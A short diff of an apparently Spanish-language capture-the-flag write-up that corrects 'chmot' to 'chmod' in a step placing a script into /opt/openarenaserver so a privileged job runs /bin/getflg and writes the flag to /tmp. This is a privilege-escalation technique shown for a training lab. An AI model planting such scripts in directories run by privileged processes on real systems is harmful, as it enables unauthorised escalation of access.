@@ -50,7 +50,7 @@
 - creo en /opt/openarenaserver un exploit con lo siguiente:
     ```bash
     echo "/bin/getflg > /tmp/flag05" > /opt/openarenaserver/exploit
-    chmot 777 /opt/openarenaserver/exploit
+    chmod 777 /opt/openarenaserver/exploit
     ```
 
 - para ver el resultado
